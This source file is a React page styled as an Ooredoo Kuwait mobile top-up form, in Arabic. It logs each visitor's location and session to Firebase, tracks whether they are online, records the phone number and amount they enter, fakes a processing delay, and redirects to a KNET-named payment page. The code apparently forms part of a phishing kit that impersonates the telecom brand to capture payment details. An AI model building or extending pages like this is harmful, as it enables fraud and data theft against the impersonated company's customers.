"use client"

import type React from "react"

import { useEffect, useState, useCallback } from "react"
import { useRouter } from "next/navigation"
import { ArrowLeft, Receipt, Loader2, Trash2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent } from "@/components/ui/card"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"

interface PaymentData {
  id: string
  phone?: string
  country?: string
  amount?: string
}

interface LocationResponse {
  country_name: string
}

export default function PaymentPage() {
  const router = useRouter()
  const [amount, setAmount] = useState("5.0")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [isInitializing, setIsInitializing] = useState(true)

  const generateId = useCallback((prefix = "ooredoo-"): string => {
    return `${prefix}${Math.random().toString(36).substring(2, 15)}`
  }, [])

  const formatAmount = useCallback((value: string): string => {
    const numericValue = Number.parseFloat(value.replace(/[^\d.]/g, ""))
    return isNaN(numericValue) ? "0.0" : numericValue.toFixed(1)
  }, [])

  const validatePhoneNumber = useCallback((phone: string): boolean => {
    const phoneRegex = /^[0-9]{8}$/
    return phoneRegex.test(phone)
  }, [])

  const getLocationData = useCallback(async (): Promise<string | null> => {
    try {
      // In production, this should be handled server-side to protect the API key
      const response = await fetch("/api/location")

      if (!response.ok) {
        throw new Error(`Failed to fetch location: ${response.status}`)
      }

      const data: LocationResponse = await response.json()
      return data.country_name
    } catch (error) {
      console.error("Location detection failed:", error)
     
      return null
    }
  }, [])

  const initializeSession = useCallback(async () => {
    try {
      setIsInitializing(true)
      const sessionId = generateId()
      const country = await getLocationData()

      const sessionData: PaymentData = {
        id: sessionId,
        ...(country && { country }),
      }

      await addData(sessionData)
      localStorage.setItem("sessionId", sessionId)
      if (country) {
        localStorage.setItem("country", country)
      }

      setupOnlineStatus(sessionId)
    } catch (error) {
      console.error("Session initialization failed:", error)
     
    } finally {
      setIsInitializing(false)
    }
  }, [generateId, getLocationData])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!validatePhoneNumber(phoneNumber)) {
     
      return
    }

    const numericAmount = Number.parseFloat(amount.replace(/[^\d.]/g, ""))
    if (numericAmount < 1 || numericAmount > 100) {
    
      return
    }

    setIsLoading(true)

    try {
      const sessionId = localStorage.getItem("sessionId")
      if (!sessionId) {
        throw new Error("Session not found")
      }

      const paymentData: PaymentData = {
        id: sessionId,
        phone: phoneNumber,
        amount: amount,
      }

      await addData(paymentData)
      localStorage.setItem("paymentAmount", amount)

     

      // Simulate processing time
      await new Promise((resolve) => setTimeout(resolve, 1500))
      router.push("/payment/knet")
    } catch (error) {
      console.error("Payment submission failed:", error)
    
    } finally {
      setIsLoading(false)
    }
  }

  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^\d.]/g, "")
    setAmount(formatAmount(value))
  }

  const clearAmount = () => {
    setAmount("0.000")
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^\d]/g, "").slice(0, 8)
    setPhoneNumber(value)
  }

  useEffect(() => {
    initializeSession()
  }, [initializeSession])

  useEffect(() => {
    localStorage.setItem("paymentAmount", amount)
  }, [amount])

  if (isInitializing) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-50">
        <div className="text-center">
          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4 text-red-500" />
          <p className="text-gray-600">جاري التحميل...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="flex flex-col min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-white shadow-sm sticky top-0 z-50">
        <div className="flex justify-between items-center p-4">
          <div className="flex items-center">
            <div className="flex items-center border border-gray-300 rounded-full px-4 py-2 bg-gray-50">
              <span className="text-sm font-medium text-gray-600">English</span>
              <span className="mx-2 text-gray-300">|</span>
              <span className="text-sm font-bold text-gray-900">عربي</span>
            </div>
          </div>
          <Button
            variant="ghost"
            size="sm"
            onClick={() => router.back()}
            className="p-2 hover:bg-gray-100 rounded-full"
          >
            <ArrowLeft className="w-5 h-5" />
          </Button>
        </div>
      </header>

      <main className="flex-1 p-4 space-y-6">
        {/* Promotional Banner */}
        <Card className="overflow-hidden">
          <div className="relative">
            <img
              src="/zf.png"
              alt="عرض الدفع الذكي"
              className="w-full h-48 object-cover"
            />
            <div className="absolute inset-0 " />
          </div>
        </Card>

        {/* Payment Form */}
        <Card>
          <CardContent className="p-6">
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Form Headers */}
              <div className="flex justify-between items-center">
                <h2 className="text-xl font-bold text-gray-900">رقم الموبايل</h2>
                <h2 className="text-xl font-bold text-gray-900">المبلغ</h2>
              </div>

              {/* Input Fields */}
              <div className="flex gap-4">
                <div className="flex-1">
                  <Input
                    type="tel"
                    value={phoneNumber}
                    onChange={handlePhoneChange}
                    placeholder="60012345"
                    className="text-right py-4 text-lg border-gray-300 focus:border-red-500 focus:ring-red-500"
                    dir="rtl"
                    required
                    aria-label="رقم الموبايل"
                  />
                  {phoneNumber && !validatePhoneNumber(phoneNumber) && (
                    <p className="text-sm text-red-500 mt-1 text-right">يجب أن يكون الرقم مكون من 8 أرقام</p>
                  )}
                </div>

                <div className="relative w-32">
                  <Input
                    type="text"
                    value={amount}
                    onChange={handleAmountChange}
                    className="text-center py-4 text-lg font-medium border-gray-300 focus:border-red-500 focus:ring-red-500 pr-10 pl-12"
                    dir="rtl"
                    aria-label="المبلغ"
                  />
                  <div className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 font-medium text-sm">
                    د.ك
                  </div>
                  <Button
                    type="button"
                    variant="ghost"
                    size="sm"
                    onClick={clearAmount}
                    className="absolute right-2 top-1/2 transform -translate-y-1/2 p-1 hover:bg-gray-100 rounded"
                  >
                    <Trash2 className="w-4 h-4 text-gray-400" />
                  </Button>
                </div>
              </div>

              {/* Pay to Another Number Button */}
              <Button
                type="button"
                variant="outline"
                className="w-full py-4 border-red-500 text-red-500 hover:bg-red-50 rounded-full text-lg font-medium"
              >
                الدفع لرقم آخر
              </Button>

              {/* Payment Summary */}
              <div className="bg-gray-50 rounded-lg p-4 space-y-3">
                <div className="flex items-center justify-between">
                  <div className="flex items-center text-gray-700">
                    <Receipt className="w-5 h-5 text-red-500 ml-2" />
                    <span className="text-lg font-medium">إعادة التعبئة / دفع الفواتير</span>
                  </div>
                </div>

                <div className="flex justify-between items-center pt-2 border-t border-gray-200">
                  <div className="text-xl font-bold text-gray-900">د.ك {formatAmount(amount)}</div>
                  <div className="text-lg font-medium text-gray-700">الإجمالي:</div>
                </div>
              </div>

              {/* Submit Button */}
              <Button
                type="submit"
                disabled={isLoading || !phoneNumber || !validatePhoneNumber(phoneNumber)}
                className="w-full py-4 bg-red-500 hover:bg-red-600 disabled:bg-gray-300 disabled:text-gray-500 text-white rounded-full text-lg font-medium transition-colors"
              >
                {isLoading ? (
                  <div className="flex items-center justify-center">
                    <Loader2 className="w-5 h-5 animate-spin ml-2" />
                    <span>جاري المعالجة...</span>
                  </div>
                ) : (
                  <span>استمرار</span>
                )}
              </Button>
            </form>
          </CardContent>
        </Card>
      </main>
    </div>
  )
}
